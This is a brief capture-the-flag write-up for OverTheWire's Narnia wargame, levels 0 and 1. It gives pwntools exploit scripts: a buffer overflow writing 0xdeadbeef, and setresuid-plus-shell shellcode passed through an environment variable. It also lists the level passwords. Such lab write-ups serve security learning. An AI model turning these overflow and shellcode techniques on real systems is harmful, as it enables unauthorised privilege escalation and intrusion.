
**Narnia 0**
ssh: `ssh narnia0@narnia.labs.overthewire.org -p 2226`
exploit:
```python
from pwn import *

e = ELF("/narnia/narnia0")
context.log_level = 'debug' #mostra inpiut e output
context.binary = e #si adatta al formato dell'elf

p = process()
payload = b'B'*20 + p32(0xdeadbeef)
p.sendafter('\n', payload)
p.interactive()
```
password in `/etc/narnia_pass/narnia1`: eaa6AjYMBB

---
**Narnia 1**
exploit:
```python
from pwn import *

e = ELF("/narnia/narnia1")
context.log_level = "debug"
context.binary = e

p = process(e.path, env = {'EGG':asm(shellcraft.setresuid() + shellcraft.sh())})
p.interactive()
```
password: Zzb6MIyceT